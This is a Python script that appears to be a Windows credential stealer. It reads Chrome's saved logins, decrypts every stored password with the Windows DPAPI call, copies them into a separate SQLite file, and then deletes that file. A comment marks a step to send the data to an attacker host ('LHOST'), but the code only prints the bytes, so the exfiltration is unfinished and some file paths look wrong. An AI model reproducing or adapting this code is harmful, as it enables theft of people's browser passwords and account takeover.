from os import getenv
from os import remove
import sqlite3
import win32crypt
import struct, os

default_user = os.path.join('C:\\Users', os.getlogin(), 'AppData\Local\Google\Chrome', 'User Data\Default\Login_Data.db')
passfilename = r'C:\Users\Vicky Kumar\AppData\Local\Google\Chrome\User Data\Default\passwordsdecrypt.db'

conn = sqlite3.connect(default_user)
conn2 = sqlite3.connect(passfilename)

cursor = conn.cursor()
cursor2 = conn2.cursor()

cursor.execute(
    'SELECT action_url, username_value, password_value FROM logins')
cursor2.execute('''CREATE TABLE passwords(url, username, password)''')

for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(
        result[2], None, None, None, 0)[1]
    url = result[0]
    username = result[1]
    if password:
        cursor2.execute(
            "INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (url, username, password))
        conn2.commit()

conn.close()
conn2.close()

# Connect LHOST and send login_data
binary_data = None
with open(passfilename, 'rb') as passfile:
    binary_data = passfile.read()
    print(binary_data)

# Remove db
try:
    remove(passfilename)
except Exception as e:
    print(e)
